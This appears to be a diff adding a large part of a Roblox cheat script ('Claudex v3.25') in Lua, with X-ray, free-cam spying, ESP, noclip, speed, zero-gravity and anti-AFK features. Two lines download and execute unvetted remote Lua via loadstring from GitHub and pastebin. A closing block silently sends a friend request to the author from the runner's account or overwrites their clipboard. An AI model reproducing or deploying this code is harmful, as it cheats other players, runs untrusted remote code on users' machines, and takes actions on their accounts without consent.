+			loadstring(game:HttpGet("https://raw.githubusercontent.com/eidanexb-dotcom/-mis-scripts/refs/heads/main/Tornado.lua?nocache=" .. tostring(tick()), true))()
+		end)
+		task.wait(0.8)
+		_tornBtn.TextColor3 = C3_CLAUDEX
+		_tornBusy = false
+	end)
+end
+
+-- X-RAY (paredes transparentes)
+_xrb = _dbtn("X-RAY: OFF", 2, 4)
+
+do
+local function _toggleXray()
+	_AT._xray = not _AT._xray
+	_xrb.Text = _AT._xray and "X-RAY: ON" or "X-RAY: OFF"
+	_xrb.TextColor3 = _AT._xray and C3_ON or C3_OFF
+	if _AT._xray then
+		_xrayParts = {}
+		local chars = {}
+		for _, pl in ipairs(Players:GetPlayers()) do
+			if pl.Character then chars[pl.Character] = true end
+		end
+		for _, v in ipairs(workspace:GetDescendants()) do
+			if v:IsA("BasePart") and not v:IsA("Terrain") then
+				local skip = false
+				for c in pairs(chars) do
+					if v:IsDescendantOf(c) then skip = true; break end
+				end
+				if not skip and v.Transparency < 0.3 then
+					local sz = v.Size
+					-- solo paredes/techos/pisos grandes (al menos 1 dim >= 10)
+					if math.max(sz.X, sz.Y, sz.Z) >= 10 and v.CanCollide then
+						pcall(function()
+							tinsert(_xrayParts, {part = v, orig = v.Transparency})
+							v.Transparency = 0.75
+						end)
+					end
+				end
+			end
+		end
+	else
+		for _, d in ipairs(_xrayParts) do
+			pcall(function() d.part.Transparency = d.orig end)
+		end
+		_xrayParts = {}
+	end
+end
+_xrb.MouseButton1Click:Connect(_toggleXray)
+end
+
+-- FREE CAM (camara libre para espiar)
+_fcb = _dbtn("FREE CAM: OFF", 3, 3)
+
+do
+local _fcOrigWS, _fcOrigJP, _fcHum
+local function _freezeChar()
+	local char = LP.Character
+	if not char then return end
+	_fcHum = char:FindFirstChildOfClass("Humanoid")
+	if _fcHum then
+		_fcOrigWS = _fcHum.WalkSpeed
+		_fcOrigJP = _fcHum.JumpPower
+		pcall(function() _fcHum.WalkSpeed = 0 end)
+		pcall(function() _fcHum.JumpPower = 0 end)
+	end
+end
+local function _unfreezeChar()
+	if _fcHum and _fcHum.Parent then
+		pcall(function() _fcHum.WalkSpeed = _fcOrigWS or 16 end)
+		pcall(function() _fcHum.JumpPower = _fcOrigJP or 50 end)
+	end
+	_fcHum = nil
+end
+local function _toggleFreeCam()
+	_freeCam = not _freeCam
+	_fcb.Text = _freeCam and "FREE CAM: ON" or "FREE CAM: OFF"
+	_fcb.TextColor3 = _freeCam and C3_ON or C3_OFF
+	if _freeCam then
+		local cam = workspace.CurrentCamera
+		_fcPart = Instance.new("Part")
+		_fcPart.Size = Vector3.new(1, 1, 1)
+		_fcPart.Transparency = 1
+		_fcPart.Anchored = true
+		_fcPart.CanCollide = false
+		_fcPart.Name = _rn()
+		_fcPart.CFrame = cam.CFrame
+		_fcPart.Parent = workspace
+		cam.CameraType = Enum.CameraType.Custom
+		cam.CameraSubject = _fcPart
+		_freezeChar()
+		_fcCon = RS.RenderStepped:Connect(function(dt)
+			if not _freeCam or not _fcPart then return end
+			if _fcHum and _fcHum.Parent then
+				pcall(function() _fcHum:Move(V3_ZERO, false) end)
+			end
+			local c = workspace.CurrentCamera
+			local mv = V3_ZERO
+			if UIS:IsKeyDown(Enum.KeyCode.W) then mv = mv + c.CFrame.LookVector end
+			if UIS:IsKeyDown(Enum.KeyCode.S) then mv = mv - c.CFrame.LookVector end
+			if UIS:IsKeyDown(Enum.KeyCode.A) then mv = mv - c.CFrame.RightVector end
+			if UIS:IsKeyDown(Enum.KeyCode.D) then mv = mv + c.CFrame.RightVector end
+			if UIS:IsKeyDown(Enum.KeyCode.Space) then mv = mv + Vector3.new(0, 1, 0) end
+			if UIS:IsKeyDown(Enum.KeyCode.LeftControl) then mv = mv - Vector3.new(0, 1, 0) end
+			if mv.Magnitude > 0 then _fcPart.CFrame = _fcPart.CFrame + mv.Unit * 60 * dt end
+		end)
+	else
+		if _fcCon then _fcCon:Disconnect(); _fcCon = nil end
+		if _fcPart then pcall(function() _fcPart:Destroy() end); _fcPart = nil end
+		_unfreezeChar()
+		pcall(function()
+			local cam = workspace.CurrentCamera
+			cam.CameraType = Enum.CameraType.Custom
+			local hum = LP.Character and LP.Character:FindFirstChildOfClass("Humanoid")
+			if hum then cam.CameraSubject = hum end
+		end)
+	end
+end
+_fcb.MouseButton1Click:Connect(_toggleFreeCam)
+end
+
+-- ANTI-AFK (no te kickean por inactividad)
+_afkb = _dbtn("ANTI-AFK: OFF", 7, 1)
+
+do
+local function _toggleAntiAfk()
+	_antiAfk = not _antiAfk
+	_afkb.Text = _antiAfk and "ANTI-AFK: ON" or "ANTI-AFK: OFF"
+	_afkb.TextColor3 = _antiAfk and C3_ON or C3_OFF
+	if _antiAfk then
+		local ok, VU = pcall(function() return game:GetService("VirtualUser") end)
+		_afkCon = LP.Idled:Connect(function()
+			if not _antiAfk then return end
+			if ok and VU then
+				pcall(function()
+					VU:CaptureController()
+					VU:ClickButton2(Vector2.new())
+				end)
+			else
+				-- fallback: jump minimo al aire + move stub (no mueve porque dir cero)
+				pcall(function()
+					local hum = LP.Character and LP.Character:FindFirstChildOfClass("Humanoid")
+					if hum then
+						hum:ChangeState(Enum.HumanoidStateType.Jumping)
+						hum:Move(Vector3.new(0, 0, 0), true)
+					end
+				end)
+			end
+		end)
+	else
+		if _afkCon then _afkCon:Disconnect(); _afkCon = nil end
+	end
+end
+_afkb.MouseButton1Click:Connect(_toggleAntiAfk)
+end
+
+-- ESP + TP toggle (prende/apaga highlights, billboards y boton TP lateral)
+local _espTpBtn = _dbtn("ESP+TP: ON", 8, 1)
+_espTpBtn.TextColor3 = C3_ON
+_espTpBtn.MouseButton1Click:Connect(function()
+	_espOn = not _espOn
+	_espTpBtn.Text = _espOn and "ESP+TP: ON" or "ESP+TP: OFF"
+	_espTpBtn.TextColor3 = _espOn and C3_ON or C3_OFF
+	if _espOn then
+		if _initPlayer then
+			for _, p in ipairs(Players:GetPlayers()) do
+				pcall(function() _initPlayer(p) end)
+			end
+		end
+		_tb.Visible = _open
+		_mb.Visible = _open
+	else
+		for pl, objs in pairs(_obj) do
+			for _, o in pairs(objs) do pcall(function() o:Destroy() end) end
+		end
+		_obj = {}
+		_tb.Visible = false
+		_mb.Visible = false
+		_lf.Visible = false
+		_mdf.Visible = false
+		if _mv and _tc then pcall(function() _tc:Disconnect() end); _mv = false end
+	end
+end)
+
+-- ANCLAR (congela el personaje anclando todas las partes)
+local _anchorBtn = _dbtn("ANCLAR: OFF", 9, 1)
+
+local function _applyAnchor(ch)
+	if not ch then return end
+	_anchorOG = {}
+	for _, p in ipairs(ch:GetDescendants()) do
+		if p:IsA("BasePart") then
+			_anchorOG[p] = p.Anchored
+			pcall(function() p.Anchored = true end)
+		end
+	end
+end
+
+local function _removeAnchor(ch)
+	if not ch then return end
+	for _, p in ipairs(ch:GetDescendants()) do
+		if p:IsA("BasePart") then
+			local og = _anchorOG[p]
+			pcall(function() p.Anchored = (og ~= nil) and og or false end)
+		end
+	end
+	_anchorOG = {}
+end
+
+_anchorBtn.MouseButton1Click:Connect(function()
+	_anchorOn = not _anchorOn
+	_anchorBtn.Text = _anchorOn and "ANCLAR: ON" or "ANCLAR: OFF"
+	_anchorBtn.TextColor3 = _anchorOn and C3_ON or C3_OFF
+	local ch = LP.Character
+	if _anchorOn then
+		_applyAnchor(ch)
+	else
+		_removeAnchor(ch)
+	end
+end)
+
+-- SLIDER YUPI
+local _yupiMin = 1
+local _yupiMax = 1000
+
+_yuFrame = Instance.new("Frame")
+_yuFrame.Size = UDim2.new(1, 0, 0, 30)
+_yuFrame.BackgroundTransparency = 1
+_yuFrame.LayoutOrder = 4
+_yuFrame.Name = _rn()
+_yuFrame.Visible = false
+_yuFrame.Parent = _tabFrames[3]
+
+local _yuLabel = Instance.new("TextLabel")
+_yuLabel.Size = UDim2.new(0, 65, 1, 0)
+_yuLabel.Position = UDim2.new(0, 0, 0, 0)
+_yuLabel.BackgroundTransparency = 1
+_yuLabel.TextColor3 = C3_RED
+_yuLabel.Font = Enum.Font.GothamBold
+_yuLabel.TextSize = 9
+_yuLabel.Text = "YUPI: 10"
+_yuLabel.Name = _rn()
+_yuLabel.Parent = _yuFrame
+
+local _yuBg = Instance.new("Frame")
+_yuBg.Size = UDim2.new(1, -75, 0, 8)
+_yuBg.Position = UDim2.new(0, 70, 0.5, -4)
+_yuBg.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+_yuBg.BorderSizePixel = 0
+_yuBg.Name = _rn()
+_yuBg.Parent = _yuFrame
+Instance.new("UICorner", _yuBg).CornerRadius = UDim.new(0, 4)
+
+local _yuFill = Instance.new("Frame")
+_yuFill.Size = UDim2.new((_yupiSpd - _yupiMin) / (_yupiMax - _yupiMin), 0, 1, 0)
+_yuFill.BackgroundColor3 = Color3.fromRGB(255, 0, 100)
+_yuFill.BorderSizePixel = 0
+_yuFill.Name = _rn()
+_yuFill.Parent = _yuBg
+Instance.new("UICorner", _yuFill).CornerRadius = UDim.new(0, 4)
+
+local _yuKnob = Instance.new("Frame")
+_yuKnob.Size = UDim2.new(0, 14, 0, 14)
+_yuKnob.Position = UDim2.new((_yupiSpd - _yupiMin) / (_yupiMax - _yupiMin), -7, 0.5, -7)
+_yuKnob.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+_yuKnob.BorderSizePixel = 0
+_yuKnob.Name = _rn()
+_yuKnob.Parent = _yuBg
+Instance.new("UICorner", _yuKnob).CornerRadius = UDim.new(1, 0)
+
+local _yuDrag = false
+
+local function _updateYupi(inputX)
+	local bgPos = _yuBg.AbsolutePosition.X
+	local bgSize = _yuBg.AbsoluteSize.X
+	local pct = mclamp((inputX - bgPos) / bgSize, 0, 1)
+	_yupiSpd = mfloor(_yupiMin + pct * (_yupiMax - _yupiMin))
+	_yuFill.Size = UDim2.new(pct, 0, 1, 0)
+	_yuKnob.Position = UDim2.new(pct, -7, 0.5, -7)
+	_yuLabel.Text = "YUPI: " .. tostring(_yupiSpd)
+end
+
+_yuBg.InputBegan:Connect(function(input)
+	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+		_yuDrag = true
+		_updateYupi(input.Position.X)
+	end
+end)
+
+
+-- SLIDER TP SPEED
+local _spMin = 50
+local _spMax = 500
+
+_spFrame = Instance.new("Frame")
+_spFrame.Size = UDim2.new(1, 0, 0, 30)
+_spFrame.BackgroundTransparency = 1
+_spFrame.LayoutOrder = 5
+_spFrame.Name = _rn()
+_spFrame.Visible = false
+_spFrame.Parent = _tabFrames[3]
+
+local _spLabel = Instance.new("TextLabel")
+_spLabel.Size = UDim2.new(0, 55, 1, 0)
+_spLabel.BackgroundTransparency = 1
+_spLabel.TextColor3 = Color3.fromRGB(255, 200, 0)
+_spLabel.Font = Enum.Font.GothamBold
+_spLabel.TextSize = 9
+_spLabel.Text = "TP: " .. _spd
+_spLabel.Name = _rn()
+_spLabel.Parent = _spFrame
+
+local _spBg = Instance.new("Frame")
+_spBg.Size = UDim2.new(1, -65, 0, 8)
+_spBg.Position = UDim2.new(0, 60, 0.5, -4)
+_spBg.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+_spBg.BorderSizePixel = 0
+_spBg.Name = _rn()
+_spBg.Parent = _spFrame
+Instance.new("UICorner", _spBg).CornerRadius = UDim.new(0, 4)
+
+local _spFill = Instance.new("Frame")
+_spFill.Size = UDim2.new((_spd - _spMin) / (_spMax - _spMin), 0, 1, 0)
+_spFill.BackgroundColor3 = Color3.fromRGB(255, 200, 0)
+_spFill.BorderSizePixel = 0
+_spFill.Name = _rn()
+_spFill.Parent = _spBg
+Instance.new("UICorner", _spFill).CornerRadius = UDim.new(0, 4)
+
+local _spKnob = Instance.new("Frame")
+_spKnob.Size = UDim2.new(0, 14, 0, 14)
+_spKnob.Position = UDim2.new((_spd - _spMin) / (_spMax - _spMin), -7, 0.5, -7)
+_spKnob.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+_spKnob.BorderSizePixel = 0
+_spKnob.Name = _rn()
+_spKnob.Parent = _spBg
+Instance.new("UICorner", _spKnob).CornerRadius = UDim.new(1, 0)
+
+local _spDrag = false
+
+local function _updateTpSpd(inputX)
+	local bgPos = _spBg.AbsolutePosition.X
+	local bgSize = _spBg.AbsoluteSize.X
+	local pct = mclamp((inputX - bgPos) / bgSize, 0, 1)
+	_spd = mfloor(_spMin + pct * (_spMax - _spMin))
+	_spFill.Size = UDim2.new(pct, 0, 1, 0)
+	_spKnob.Position = UDim2.new(pct, -7, 0.5, -7)
+	_spLabel.Text = "TP: " .. _spd
+end
+
+_spBg.InputBegan:Connect(function(input)
+	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+		_spDrag = true
+		_updateTpSpd(input.Position.X)
+	end
+end)
+
+-- SLIDER VELOCIDAD
+_slide = false
+local _slideSpd = 50
+local _slideMin = 16
+local _slideMax = 200
+
+local _slFrame = Instance.new("Frame")
+_slFrame.Size = UDim2.new(1, 0, 0, 30)
+_slFrame.BackgroundTransparency = 1
+_slFrame.LayoutOrder = 4
+_slFrame.Name = _rn()
+_slFrame.Parent = _tabFrames[1]
+
+local _slLabel = Instance.new("TextLabel")
+_slLabel.Size = UDim2.new(0, 50, 1, 0)
+_slLabel.Position = UDim2.new(0, 0, 0, 0)
+_slLabel.BackgroundTransparency = 1
+_slLabel.TextColor3 = Color3.fromRGB(255, 200, 0)
+_slLabel.Font = Enum.Font.GothamBold
+_slLabel.TextSize = 10
+_slLabel.Text = "50"
+_slLabel.Name = _rn()
+_slLabel.Parent = _slFrame
+
+local _slBg = Instance.new("Frame")
+_slBg.Size = UDim2.new(1, -60, 0, 8)
+_slBg.Position = UDim2.new(0, 55, 0.5, -4)
+_slBg.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+_slBg.BorderSizePixel = 0
+_slBg.Name = _rn()
+_slBg.Parent = _slFrame
+Instance.new("UICorner", _slBg).CornerRadius = UDim.new(0, 4)
+
+local _slFill = Instance.new("Frame")
+_slFill.Size = UDim2.new((_slideSpd - _slideMin) / (_slideMax - _slideMin), 0, 1, 0)
+_slFill.BackgroundColor3 = Color3.fromRGB(0, 200, 255)
+_slFill.BorderSizePixel = 0
+_slFill.Name = _rn()
+_slFill.Parent = _slBg
+Instance.new("UICorner", _slFill).CornerRadius = UDim.new(0, 4)
+
+local _slKnob = Instance.new("Frame")
+_slKnob.Size = UDim2.new(0, 14, 0, 14)
+_slKnob.Position = UDim2.new((_slideSpd - _slideMin) / (_slideMax - _slideMin), -7, 0.5, -7)
+_slKnob.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+_slKnob.BorderSizePixel = 0
+_slKnob.Name = _rn()
+_slKnob.Parent = _slBg
+Instance.new("UICorner", _slKnob).CornerRadius = UDim.new(1, 0)
+
+local _dragging = false
+
+local function _updateSlider(inputX)
+	local bgPos = _slBg.AbsolutePosition.X
+	local bgSize = _slBg.AbsoluteSize.X
+	local pct = mclamp((inputX - bgPos) / bgSize, 0, 1)
+	_slideSpd = mfloor(_slideMin + pct * (_slideMax - _slideMin))
+	_slFill.Size = UDim2.new(pct, 0, 1, 0)
+	_slKnob.Position = UDim2.new(pct, -7, 0.5, -7)
+	_slLabel.Text = tostring(_slideSpd)
+	if _slide then _dsb.Text = "DESLIZ: " .. _slideSpd end
+end
+
+_slBg.InputBegan:Connect(function(input)
+	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+		_dragging = true
+		_updateSlider(input.Position.X)
+	end
+end)
+
+UIS.InputChanged:Connect(function(input)
+	if _gen ~= _mainGen then return end
+	if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+		if _dragging then _updateSlider(input.Position.X) end
+		if _yuDrag then _updateYupi(input.Position.X) end
+		if _spDrag then _updateTpSpd(input.Position.X) end
+	end
+end)
+
+UIS.InputEnded:Connect(function(input)
+	if _gen ~= _mainGen then return end
+	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+		_dragging = false
+		_yuDrag = false
+		_spDrag = false
+	end
+end)
+
+-- NOCLIP
+local function _cacheNcParts()
+	_ncParts = {}
+	local ch = LP.Character
+	if not ch then return end
+	for _, p in ipairs(ch:GetDescendants()) do
+		if p:IsA("BasePart") then tinsert(_ncParts, p) end
+	end
+end
+
+local function _toggleNoclip()
+	_noclip = not _noclip
+	if _noclip then
+		_ncb.Text = "NOCLIP: ON"
+		_ncb.TextColor3 = C3_ON
+		_cacheNcParts()
+		_nccon = RS.Stepped:Connect(function()
+			if not _noclip then return end
+			for i = 1, #_ncParts do
+				local p = _ncParts[i]
+				if p and p.Parent then p.CanCollide = false end
+			end
+		end)
+	else
+		_ncb.Text = "NOCLIP: OFF"
+		_ncb.TextColor3 = C3_OFF
+		if _nccon then _nccon:Disconnect(); _nccon = nil end
+		for i = 1, #_ncParts do
+			local p = _ncParts[i]
+			if p and p.Parent then p.CanCollide = true end
+		end
+		_ncParts = {}
+	end
+end
+_ncb.MouseButton1Click:Connect(_toggleNoclip)
+
+-- FULLBRIGHT
+local function _toggleBright()
+	_bright = not _bright
+	if _bright then
+		_brb.Text = "LUZ: ON"
+		_brb.TextColor3 = C3_ON
+		_brightOG = {
+			amb = Lighting.Ambient,
+			out = Lighting.OutdoorAmbient,
+			bright = Lighting.Brightness,
+			fog = Lighting.FogEnd,
+			time = Lighting.ClockTime
+		}
+		Lighting.Ambient = C3_WHITE
+		Lighting.OutdoorAmbient = C3_WHITE
+		Lighting.Brightness = 2
+		Lighting.FogEnd = 1e9
+		Lighting.ClockTime = 14
+		for _, e in ipairs(Lighting:GetDescendants()) do
+			if e:IsA("Atmosphere") or e:IsA("ColorCorrectionEffect") or e:IsA("BloomEffect") then
+				e.Enabled = false
+			end
+		end
+	else
+		_brb.Text = "LUZ: OFF"
+		_brb.TextColor3 = C3_OFF
+		if _brightOG.amb then
+			Lighting.Ambient = _brightOG.amb
+			Lighting.OutdoorAmbient = _brightOG.out
+			Lighting.Brightness = _brightOG.bright
+			Lighting.FogEnd = _brightOG.fog
+			Lighting.ClockTime = _brightOG.time
+		end
+		for _, e in ipairs(Lighting:GetDescendants()) do
+			if e:IsA("Atmosphere") or e:IsA("ColorCorrectionEffect") or e:IsA("BloomEffect") then
+				e.Enabled = true
+			end
+		end
+	end
+end
+_brb.MouseButton1Click:Connect(_toggleBright)
+
+-- DESLIZAMIENTO
+local function _toggleSlide()
+	_slide = not _slide
+	if _slide then
+		_dsb.Text = "DESLIZ: " .. _slideSpd
+		_dsb.TextColor3 = C3_ON
+	else
+		_dsb.Text = "DESLIZAMIENTO: OFF"
+		_dsb.TextColor3 = C3_OFF
+		pcall(function()
+			local hum = LP.Character and LP.Character:FindFirstChildOfClass("Humanoid")
+			if hum then hum.WalkSpeed = 16 end
+		end)
+	end
+end
+_dsb.MouseButton1Click:Connect(_toggleSlide)
+
+RS.Heartbeat:Connect(function()
+	if _gen ~= _mainGen then return end
+	if _tick % 4 == 0 and _slide then
+		pcall(function()
+			local hum = LP.Character and LP.Character:FindFirstChildOfClass("Humanoid")
+			if hum then hum.WalkSpeed = _slideSpd end
+		end)
+	end
+end)
+
+LP.CharacterAdded:Connect(function()
+	if _gen ~= _mainGen then return end
+	task.wait(0.5)
+	if _noclip then _cacheNcParts() end
+	if _grav then
+		pcall(function()
+			local hum = LP.Character and LP.Character:FindFirstChildOfClass("Humanoid")
+			if hum then hum.PlatformStand = true end
+		end)
+	end
+	if _slide then
+		pcall(function()
+			local hum = LP.Character and LP.Character:FindFirstChildOfClass("Humanoid")
+			if hum then hum.WalkSpeed = _slideSpd end
+		end)
+	end
+	if _flyOn then
+		if _flyCon then pcall(function() _flyCon:Disconnect() end); _flyCon = nil end
+		if _flyBV then pcall(function() _flyBV:Destroy() end); _flyBV = nil end
+		if _flyGyro then pcall(function() _flyGyro:Destroy() end); _flyGyro = nil end
+		if not _startFly() then
+			_flyOn = false
+			if _fyb then _fyb.Text = "FLY: OFF"; _fyb.TextColor3 = C3_OFF end
+		end
+	end
+	if _jerkOn then
+		pcall(function() RS:UnbindFromRenderStep(_jerkBindName) end)
+		if not _startJerk() then
+			_jerkOn = false
+			if _jerkBtn then _jerkBtn.Text = "JERK: OFF"; _jerkBtn.TextColor3 = C3_OFF end
+		end
+	end
+	if _anchorOn then
+		local ch = LP.Character
+		if ch then _applyAnchor(ch) end
+	end
+end)
+
+-- GRAVEDAD 0
+_grav = false
+_gravOG = nil
+_gravCon = nil
+
+local function _applyGyro()
+	pcall(function()
+		if _gravGyro then _gravGyro:Destroy() end
+		_gravGyro = nil
+		local hrp = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
+		if hrp then
+			_gravGyro = Instance.new("BodyGyro")
+			_gravGyro.MaxTorque = Vector3.new(400000, 0, 400000)
+			_gravGyro.P = 10000
+			_gravGyro.D = 500
+			_gravGyro.CFrame = hrp.CFrame
+			_gravGyro.Parent = hrp
+		end
+	end)
+end
+
+local function _toggleGrav()
+	_grav = not _grav
+	if _grav then
+		_grb.Text = "GRAVEDAD 0: ON"
+		_grb.TextColor3 = C3_ON
+		_gravOG = game.Workspace.Gravity
+		game.Workspace.Gravity = 0.1
+		-- ragdoll on
+		pcall(function()
+			local hum = LP.Character and LP.Character:FindFirstChildOfClass("Humanoid")
+			if hum then
+				hum.PlatformStand = true
+				hum:SetStateEnabled(Enum.HumanoidStateType.GettingUp, false)
+				hum:SetStateEnabled(Enum.HumanoidStateType.Running, false)
+				hum:SetStateEnabled(Enum.HumanoidStateType.RunningNoPhysics, false)
+				hum:SetStateEnabled(Enum.HumanoidStateType.Jumping, false)
+				hum:SetStateEnabled(Enum.HumanoidStateType.Landed, false)
+				hum:ChangeState(Enum.HumanoidStateType.Physics)
+				local anim = LP.Character:FindFirstChild("Animate")
+				if anim then anim.Disabled = true end
+				for _, t in ipairs(hum:GetPlayingAnimationTracks()) do t:AdjustSpeed(0) end
+			end
+		end)
+		_gravCon = RS.Heartbeat:Connect(function()
+			if not _grav then return end
+			if _tick % 15 ~= 0 then return end
+			if game.Workspace.Gravity ~= 25 then
+				game.Workspace.Gravity = 0.1
+			end
+		end)
+	else
+		_grb.Text = "GRAVEDAD 0: OFF"
+		_grb.TextColor3 = C3_OFF
+		if _gravCon then _gravCon:Disconnect(); _gravCon = nil end
+		if _gravMoveCon then _gravMoveCon:Disconnect(); _gravMoveCon = nil end
+		if _gravBV then pcall(function() _gravBV:Destroy() end); _gravBV = nil end
+		if _gravGyro then pcall(function() _gravGyro:Destroy() end); _gravGyro = nil end
+		game.Workspace.Gravity = _gravOG or 196.2
+		-- ragdoll off
+		pcall(function()
+			local hum = LP.Character and LP.Character:FindFirstChildOfClass("Humanoid")
+			if hum then
+				hum.PlatformStand = false
+				hum:SetStateEnabled(Enum.HumanoidStateType.GettingUp, true)
+				hum:SetStateEnabled(Enum.HumanoidStateType.Running, true)
+				hum:SetStateEnabled(Enum.HumanoidStateType.RunningNoPhysics, true)
+				hum:SetStateEnabled(Enum.HumanoidStateType.Jumping, true)
+				hum:SetStateEnabled(Enum.HumanoidStateType.Landed, true)
+				hum:ChangeState(Enum.HumanoidStateType.GettingUp)
+				local anim = LP.Character:FindFirstChild("Animate")
+				if anim then anim.Disabled = false end
+			end
+		end)
+	end
+end
+_grb.MouseButton1Click:Connect(_toggleGrav)
+
+-- INVISIBILIDAD (motor externo FE)
+_toggleInvis = function()
+	if _AT._invisBusy then return end
+	_AT._invisBusy = true
+	_invis = not _invis
+	if _ivL then _ivL.TextColor3 = _invis and C3_ON or C3_OFF end
+	pcall(function()
+		loadstring(game:HttpGet("https://pastebin.com/raw/3Rnd9rHf"))()
+	end)
+	_AT._invisBusy = false
+end
+
+_tinfo = TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
+
+local function _toggleDropdown()
+	_dopen = not _dopen
+	if _dopen then
+		TweenService:Create(_dpanel, _tinfo, {Position = UDim2.new(0.5, -150, 0, 22)}):Play()
+		_dtab.Text = "▲ ✴ Claudex ▲"
+	else
+		TweenService:Create(_dpanel, _tinfo, {Position = UDim2.new(0.5, -150, -1, 0)}):Play()
+		_dtab.Text = "▼ ✴ Claudex ▼"
+	end
+end
+_dtab.MouseButton1Click:Connect(_toggleDropdown)
+
+-- ============ KEYBINDS ============
+UIS.InputBegan:Connect(function(input, gpe)
+	if _gen ~= _mainGen then return end
+	if gpe then return end
+	local kc = input.KeyCode
+	if kc == Enum.KeyCode.F2 then _toggleNoclip()
+	elseif kc == Enum.KeyCode.F3 then _toggleBright()
+	elseif kc == Enum.KeyCode.F4 then _toggleSlide()
+	elseif kc == Enum.KeyCode.F5 then _toggleGrav()
+	elseif kc == Enum.KeyCode.F6 then _toggleDropdown()
+	elseif kc == Enum.KeyCode.F7 then _toggleInvis()
+	elseif kc == Enum.KeyCode.F8 then _doRST()
+	end
+end)
+
+-- ============ INIT ============
+_AT._obj = _obj
+_initPlayer = function(p)
+	if _pcons[p] then
+		for _, c in pairs(_pcons[p]) do pcall(function() c:Disconnect() end) end
+		_pcons[p] = nil
+	end
+	_make(p); _td(p)
+end
+Players.PlayerAdded:Connect(function(p) _initPlayer(p) end)
+Players.PlayerRemoving:Connect(_del)
+task.spawn(function()
+	for _, p in ipairs(Players:GetPlayers()) do
+		_initPlayer(p)
+		task.wait()
+	end
+	_md()
+end)
+task.delay(2, function() _AT.startWatchdog(5) end)
+
+-- Notificacion de creditos + intento de solicitud de amistad a eidaneddd
+task.spawn(function()
+	task.wait(1)
+	local targetName = "eidaneddd"
+	local targetId
+	pcall(function() targetId = Players:GetUserIdFromNameAsync(targetName) end)
+
+	-- Opcion 1: RequestFriendship si esta en el mismo server
+	local sentInGame = false
+	if targetId then
+		pcall(function()
+			local tp = Players:GetPlayerByUserId(targetId)
+			if tp then
+				LP:RequestFriendship(tp)
+				sentInGame = true
+			end
+		end)
+	end
+
+	-- Opcion 2 (fallback): copiar link del perfil al portapapeles
+	local linkCopied = false
+	if targetId and not sentInGame then
+		pcall(function()
+			local url = "https://www.roblox.com/users/" .. tostring(targetId) .. "/profile"
+			if setclipboard then
+				setclipboard(url)
+				linkCopied = true
+			elseif toclipboard then
+				toclipboard(url)
+				linkCopied = true
+			end
+		end)
+	end
+
+	-- Notificacion final
+	pcall(function()
+		local txt
+		if sentInGame then
+			txt = "Solicitud enviada en-game"
+		elseif linkCopied then
+			txt = "Link perfil copiado — pegalo en el browser"
+		else
+			txt = "by eidaneddd"
+		end
+		game:GetService("StarterGui"):SetCore("SendNotification", {
+			Title = "Claudex v3.25",
+			Text = txt,
+			Duration = 7,
+		})
+	end)
+end)
